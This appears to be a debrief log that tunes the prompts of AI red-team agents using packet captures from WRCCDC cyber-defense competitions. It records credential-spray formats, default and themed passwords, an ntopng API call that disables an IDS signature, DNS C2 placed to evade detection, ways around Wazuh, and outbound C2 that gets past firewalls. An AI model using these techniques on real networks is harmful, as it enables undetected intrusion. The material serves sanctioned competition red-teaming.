---

### Finding #28

Disposition: PROMPT-FIX
Agent: OPS-001
Severity: HIGH
Category: TIMING

Description: OPS-001 should note inv3 as confirming the T+15–20min firewall baseline for human-only blue teams. This is consistent with quals (T+17min) and distinguishes human teams from AI-assisted teams (inv5 T+88sec, inv6 T+14sec). Additionally, the pre-staged WinRM access at T+9s confirms that pre-competition access deployment provides a multi-hour dwell window even in human-team environments.
Evidence: Earliest firewall RST in inv3 at T+18min (Team 1 only; most teams did not deploy). WinRM kliu@MINDMEND active at T+9s. Impacket NTLM spray at T+63s. Full internal pivot by T+60min.
Root cause: OPS-001 timing spectrum already updated with inv6 T+14s record (patch-20260316-4) but lacks the inv3 human-baseline confirmation and the pre-staged WinRM T+9s data point.
Proposed fix: Add inv3 to the timing spectrum table in OPS-001 (inv3 2025-11-15: human firewall T+18min, consistent with quals), and add a note that pre-staged WinRM/machine-account access at T+9s provides dwell time independent of firewall response speed.

---

### Finding #29

Disposition: PROMPT-FIX
Agent: PERSIST-001
Severity: HIGH
Category: RECOMMENDATION-QUALITY

Description: PERSIST-001's DNS C2 pre-planting section (added in patch-20260316-4) should be updated with the inv3 CORTEX$ machine account technique as the highest-evasion variant. The AD-domain-embedded approach (cortex.mindmend.ai) achieved 0% detection in 5.5 hours versus kalipatriot.net-style external domains which an AI blue team would detect in 60 seconds. This is a materially different and superior technique.
Evidence: 0/32 teams detected cortex.mindmend.ai in full 5.5-hour inv3 capture. Comparison: kalipatriot.net detected 0/45 teams in 12.6-min inv6 capture but projected detectable by AI blue team within 60s. CORTEX$ machine account pre-planted as legitimate AD object — passes AD audit baseline checks.
Root cause: DNS C2 pre-planting section added in patch-20260316-4 documents external-domain techniques (kalipatriot.net) but does not describe the superior AD-domain-embedded variant.
Proposed fix: Update "DNS C2 Pre-Planting" section in PERSIST-001 to add inv3 evidence row to the cross-competition table, document the CORTEX$/cortex.mindmend.ai AD-embedding technique as highest-evasion variant, and add AI blue team risk assessment: MEDIUM for external domains (detectable via TI feeds), LOW for AD-domain-embedded (indistinguishable from legitimate AD DNS traffic).

---

<!-- ===== 2026-inv4 DEBRIEF (2026-03-17) ===== -->

## Active Debrief

Source run: PCAP Analysis — 2026-inv4 (manual findings, no /training-run)
Date: 2026-03-17
Operator: —
Status: CLOSED — patch-20260317-5.md generated

---

### Finding #30

Disposition: PROMPT-FIX
Agent: RECON-001
Severity: HIGH
Category: TOPOLOGY-KNOWLEDGE

Description: RECON-001 has no knowledge of the inv4 network layout. 42 team subnets on 10.100.101–142.0/24 — the largest WRCCDC invitational observed. DC position is .25 (differs from .12 inv2, .35 inv3, .17 inv5, .14 quals). New competition agent hosts at .30 and .250 poll gRPC endpoint /c2.C2/ClaimTasks every 5s — must not be confused with red team C2. MinIO object storage on .2 instead of Linux-only. Wazuh SIEM on .240 from T=0.
Evidence: Pass 1 tshark extraction confirmed consistent 12-host-role layout across all sampled pcap files. VXLAN structure: 6 VTEPs at 10.1.3.1–6, teams distributed across VNIs. AD domain auto.auto confirmed from NTLM SPN decode (jeep.auto.auto). Competition theme: automotive industry.
Root cause: No inv4 section in RECON-001 prompt. DC position shifts every event — static assumptions about any single prior layout are incorrect.
Proposed fix: Add "WRCCDC 2026-inv4 Network Layout (auto.auto — December 2025)" section to RECON-001 with full host role mapping, 42-team count, DC at .25, MinIO on .2, Wazuh on .240, WireGuard on 10.100.10.x, gRPC framework endpoints (.30/.250 → 10.213.37.72:80), and warning not to block ClaimTasks traffic.

---

### Finding #31

Disposition: PROMPT-FIX
Agent: EXPLOIT-001
Severity: HIGH
Category: RECOMMENDATION-QUALITY

Description: EXPLOIT-001 has no inv4 automotive theme credential intelligence. The WordPress scoring account "supra" (Toyota Supra) and AD domain "auto.auto" with DC hostname "JEEP" establish the automotive theme. Password candidates follow the cross-competition [Theme][Action][Special] pattern. Primary attack target is .25 hosts (WinRM 5985 + SMB 445). This continues the pattern of a new theme-specific universal password per competition.
Evidence: NTLM type1 workstation="kali" domain="AUTO" from 10.195.124.63. SPN decode: jeep.auto.auto confirms DC hostname JEEP. WordPress user "supra" confirmed from cookie in scoring engine HTTP session. Red team targeted .25 hosts first, then .60, .63, .88 — consistent with DC-first Windows pivot pattern.
Root cause: No inv4 credential section in EXPLOIT-001. Competition theme password not yet confirmed (no plaintext captured), but pattern from prior events provides strong candidates.
Proposed fix: Add "2026-inv4 Credential Intelligence (auto.auto — Automotive Theme)" section to EXPLOIT-001 with domain info, DC hostname, WordPress user "supra", automotive-themed password candidates (DriveTheCar??, RevTheEngine!, AutoShop2025!), and WinRM target priority order (.25 first, then .60/.63/.88).

---

### Finding #32

Disposition: PROMPT-FIX
Agent: RECON-001
Severity: MEDIUM
Category: RECOMMENDATION-QUALITY

Description: RECON-001 has no fingerprints for MinIO object storage (FTP port 21 returning 500 to standard commands) or Wazuh SIEM (identified via DNS to cti.wazuh.com). Without these, RECON-001 may incorrectly diagnose MinIO FTP as a broken service and will not account for Wazuh's active threat intelligence feed as a blue team capability. MinIO's S3 HTTP API on port 9000 is the correct access path.
Evidence: FTP banner: "220 Welcome to 'MinIO' FTP Server Version='GNU AGPLv3...'" returns 500 to USER, PASS, HELP, LIST. MinIO HTTP API on :9000 responds to "GET / HTTP/1.0". All team .240 hosts connect to cti.wazuh.com (threat intelligence) and packages.wazuh.com from T=0. Some teams installing Wazuh packages during the competition window.
Root cause: MinIO FTP and Wazuh are new services first observed in inv4. No fingerprints in RECON-001.
Proposed fix: Add "New Scored Services in inv4: MinIO Object Storage and Wazuh SIEM" section to RECON-001 covering MinIO FTP behavior (port 21, 500 to all commands, real API on :9000, default creds minioadmin/minioadmin, console on :9001), Wazuh SIEM indicators (cti.wazuh.com DNS, default creds wazuh/wazuh API + admin/admin dashboard), and Wiki.js indicator (graph.requarks.io DNS).

---

### Finding #33

Disposition: PROMPT-FIX
Agent: OPS-001
Severity: MEDIUM
Category: TIMING

Description: OPS-001's timing spectrum table (updated through inv6) lacks the inv4 data point. inv4 adds a 12-minute 17-second red team pre-engagement delay — the longest observed — and a human firewall baseline of T+13–21min consistent with quals/inv3. The 42-team scale means sequential red team coverage of all subnets requires >10 minutes at minimum, requiring OPS-001 to plan parallel tooling for large-team competitions.
Evidence: Red team first packet at T+12m17s (pcap14 first frame with 10.195.124.63 as source). RST from team 109 at T+13min (pre-staged or sub-second response). SMB RSTs from teams 121 and 135 at T+16–21min. Red team absent by T+26min (pcap100). No DNS C2 or pre-staged credentials observed.
Root cause: inv4 data not yet in OPS-001 timing table. The 12-minute delay is a new operational pattern with tactical implications (later start = compressed window when human firewall T+13–21min).
Proposed fix: Add inv4 row to OPS-001 timing spectrum table (inv4 2025-12-06: 12m17s red team delay, human firewall T+13–21min, Wazuh active from T=0, 42-team scale). Add note that for 42-team competitions, parallel tooling (hydra/crackmapexec parallelism across all subnets) is required to cover the full target set within the window.

---

### Finding #34

Disposition: PROMPT-FIX
Agent: EVADE-001
Severity: HIGH
Category: RECOMMENDATION-QUALITY

Description: EVADE-001 has no knowledge of Wazuh SIEM as a deployed blue team detection capability. inv4 is the first WRCCDC event where all teams had a full HIDS+network SIEM active from T=0, including live threat intelligence from cti.wazuh.com. Wazuh detects credential spray attempts, nmap scan signatures, process execution on monitored hosts, file integrity violations, and connections to known malicious IPs. This is the highest blue team detection capability observed across all analyzed events.
Evidence: All 42 team .240 hosts make persistent connections to cti.wazuh.com (TLS, throughout capture). All 42 team .180 workstations also connect to cti.wazuh.com. Wazuh package downloads (packages.wazuh.com) observed from team 109 in pcap1 — some teams hardening Wazuh during competition. Red team (10.195.124.63) activity triggers RSTs at T+13min — faster than any non-Wazuh event except inv5/inv6.
Root cause: Wazuh not present in any prior WRCCDC event. EVADE-001's detection model does not include HIDS-level monitoring.
Proposed fix: Add "Wazuh SIEM Active on Blue Teams (inv4 — NEW CAPABILITY)" section to EVADE-001 with default detection capabilities, five evasion implications (valid-creds-only spray, no nmap probes, minimal process execution, CTI feed awareness for C2 domains, WireGuard for management), and comparison table showing Wazuh as highest-capability SIEM vs ntopng/Graylog/Prometheus in prior events.

---

### Finding #35

Disposition: PROMPT-FIX
Agent: RECON-001
Severity: MEDIUM
Category: RECOMMENDATION-QUALITY

Description: RECON-001 needs to recognize the competition gRPC agent framework (POST /c2.C2/ClaimTasks to 10.213.37.72:80) as competition infrastructure, not red team C2. Both .30 and .250 hosts in every team subnet generate this traffic at exactly 5-second intervals throughout the entire competition window. An operator who misidentifies this as red team beaconing and attempts to interfere could disrupt competition scoring or event flow.
Evidence: All 42 team .30 and .250 hosts observed sending HTTP POST to 10.213.37.72:80 with URI /c2.C2/ClaimTasks, HTTP/2 with gRPC content-type, every ~5 seconds from approximately T+3–13min per subnet. 10.100.100.30 (shared services) also polls this endpoint. Protocol: HTTP/2 gRPC with protobuf body — machine-precise 5-second interval distinguishes from human-operated C2.
Root cause: gRPC competition agent framework is new in inv4 — not observed in any prior event. Could be misclassified as red team C2 by pattern matching alone.
Proposed fix: Add "Competition gRPC Agent Framework (inv4 — NOT Red Team C2)" section to RECON-001 with server IP (10.213.37.72), port (80), endpoint (/c2.C2/ClaimTasks), source IPs (.30 and .250 in all team subnets), protocol (HTTP/2 gRPC), interval (5s), and five identification characteristics distinguishing it from red team C2 (known host positions, fixed destination, gRPC content-type, machine-precise interval, active on all 42 teams simultaneously).

<!-- ===== END 2026-inv4 DEBRIEF ===== -->

---

## Debrief History

Previous debriefs are archived below with their disposition summaries. Full patch files are in training/patches/.

### 2026-inv6 PCAP Analysis Debrief (2026-03-16)
Findings: #19–24 | All PROMPT-FIX | Patch: training/patches/patch-20260316-4.md | Status: CLOSED

### 2026-inv2 PCAP Analysis Debrief (2026-03-16)
Findings: #13–18 (inv2) | All PROMPT-FIX | Patch: training/patches/patch-20260316-3.md | Status: CLOSED

---

<!-- ===== 2026-inv5 DEBRIEF (SECOND PASS, 2026-03-17) ===== -->

## Active Debrief

Source run: PCAP Analysis — 2026-inv5 (second pass, full 4-pass analysis)
Date: 2026-03-17
Operator: —
Status: CLOSED — patch-20260317-5.md generated

### Finding #36

Disposition: PROMPT-FIX
Agent: RECON-001
Severity: HIGH
Category: MISSING-KNOWLEDGE

Description: RECON-001's inv5 host profile is incomplete. Missing: .175 as a scored HTTP/80 host (confirmed in both inv5 and inv6). Missing: .2 host scored on HTTPS/443 (confirmed). Missing: confirmation that .60 (Work1/Splunk) is scored via SSH/22 only (not HTTP). Missing: COWBUNTU as the Windows domain NetBIOS name for udderstrength.gym.
Evidence: Scoring engine SYN-ACK analysis at 13:39 file confirms .2:443, .63:80, .103:22+80, .175:80, .98:445, .86:25+80, .60:22, .100:22 as scored. NTLM auth domain = COWBUNTU.
Root cause: Prior inv5 analysis was a partial sample run (15 files); this second pass added 4 additional sample files and confirmed .175 and full service list.
Proposed fix: Recommendation #36 in PCAP-INTELLIGENCE.md.

### Finding #37

Disposition: PROMPT-FIX
Agent: EXPLOIT-001
Severity: HIGH
Category: MISSING-KNOWLEDGE

Description: EXPLOIT-001 has no specific Roundcube credential spray procedure. The exact POST format (Content-Type: application/x-www-form-urlencoded, fields: _token, _task, _action, _timezone, _user, _pass) was directly observed in inv5 traffic. Username `pyoung` was the spray target; email accounts harvested from SMTP are the username source. The spray window is T=0 to T+90s before HTTP firewalls deploy.
Evidence: Direct observation of POST /?_task=login to 10.100.102.86 with pyoung/admin, pyoung/password, pyoung/root. Timezone field contains America/Los_Angeles.
Root cause: Roundcube was a new service in inv5; no prior PCAP analysis had documented the exact spray format.
Proposed fix: Recommendations #37 and #38 in PCAP-INTELLIGENCE.md.

### Finding #38

Disposition: PROMPT-FIX
Agent: OPS-001
Severity: HIGH
Category: TIMING-CALIBRATION

Description: OPS-001 needs to know the outbound C2 bypass finding explicitly: inbound HTTP firewalls do not block outbound port 80. The pre-planted gRPC C2 (10.193.202.204:80) persisted the entire 4.5-hour competition despite all teams deploying inbound firewalls within T+22min. This means outbound-only C2 channels (HTTP/80 outbound, DNS, HTTPS/443 outbound) are not disrupted by the standard blue team firewall response.
Evidence: C2 beaconing count at T+0 = 36 hosts, T+22min = 83 hosts, T+2h39m = 94 hosts, T+4h14m = 86 hosts. Zero teams blocked the outbound C2 stream despite all teams firewalling inbound port 80.
Root cause: This is a structural blind spot in WRCCDC blue team firewall deployments — outbound traffic is not filtered. New finding from inv5 second-pass deep analysis.
Proposed fix: Recommendation #39 in PCAP-INTELLIGENCE.md.

### Finding #39

Disposition: PROMPT-FIX
Agent: EVADE-001
Severity: MEDIUM
Category: MISSING-TECHNIQUE

Description: EVADE-001 does not have the ntopng IDS disabling technique. The specific API endpoint (`POST /lua/rest/v2/disable/check.lua` with `check_subdir=flow&script_key=ndpi_http_suspicious_header`) was directly observed in inv5 traffic. ntopng uses `admin/admin` as factory default credentials. Disabling this signature prevents ntopng from alerting on HTTP attacks. ntopng persists in inv5 and later events on .2 hosts.
Evidence: API call directly observed in 10:22 file. CSRF token b3816cfda082a30d0292a49ecfc42ada persistent across files from 09:47 through 13:10. Red team queried ntopng flow list by threat score at 13:10 (monitoring own detections).
Root cause: ntopng is a new platform (first appearance in inv5); no prior analysis had documented the IDS disabling technique.
Proposed fix: Recommendation #40 in PCAP-INTELLIGENCE.md.

### Finding #40

Disposition: PROMPT-FIX
Agent: RECON-001
Severity: MEDIUM
Category: CLASSIFICATION-UPDATE

Description: Recommendation #35 (inv4) told RECON-001 the gRPC framework used 10.213.37.72 as server with .30/.250 as agents. In inv5, the server changed to 10.193.202.204 and agents expanded to ALL seven scored host types. The stable fingerprint is the endpoint path `/c2.C2/ClaimTasks` with 5-second interval — not the server IP. RECON-001 needs this update to correctly identify the framework in future events where the server IP may change again.
Evidence: /c2.C2/ClaimTasks calls from .17, .63, .86, .98, .100, .103 hosts to 10.193.202.204 confirmed in all 4 sampled time windows (T=0 through T+4.5h). 10.213.37.72:443 also present as secondary connection from .63 and .17 hosts.
Root cause: Server IP rotation between inv4 and inv5 makes IP-based identification unreliable. Path-based identification is stable.
Proposed fix: Recommendation #41 in PCAP-INTELLIGENCE.md.

### Finding #41

Disposition: PROMPT-FIX
Agent: EXPLOIT-001
Severity: MEDIUM
Category: OPERATIONAL-CONSTRAINT

Description: EXPLOIT-001 needs to know which inv5 accounts are scoring-critical and must NOT be locked during spray campaigns. `moomoo` and `ceo` are NTLM accounts used by scoring engines every 60-90 seconds against .98 hosts. `ajohnson` is the SMTP RCPT TO target for .86 Roundcube scoring. Locking any of these triggers scoring failures and alerts blue teams to the spray without operational gain.
Evidence: NTLM auth from 10.194.163.224, 10.208.104.225, 10.253.245.56 to all .98 hosts using moomoo/ceo observed continuously. SMTP RCPT TO ajohnson@udderstrength.gym appears in all scoring email checks.
Root cause: Scoring-critical accounts were identified in inv5 traffic but not flagged as spray exclusions in any agent prompt.
Proposed fix: Recommendation #42 in PCAP-INTELLIGENCE.md.

### 2026-inv5 PCAP Analysis Debrief (2026-03-17)
Findings: #36–41 | All PROMPT-FIX | Recommendations in PCAP-INTELLIGENCE.md ##36–42 | Status: OPEN
